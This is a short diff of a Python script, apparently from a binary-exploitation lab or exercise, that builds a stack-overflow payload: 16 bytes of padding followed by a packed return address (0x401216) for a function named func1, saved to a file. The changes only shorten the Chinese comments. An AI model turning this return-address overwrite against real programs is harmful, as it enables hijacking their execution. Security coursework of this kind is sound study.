@@ -4,13 +4,13 @@ import struct
 padding_len = 16 
 padding = b'A' * padding_len
 
-# 2. 根据 <func1> 地址填入: 0x401216
+# 2. <func1> 地址: 0x401216
 target_addr = 0x401216 
 
 # 3. 构造 Payload (小端序)
 payload = padding + struct.pack('<Q', target_addr)
 
-# 4. 写入文件
+# 4. 写入
 with open("ans1.txt", "wb") as f:
     f.write(payload)
 
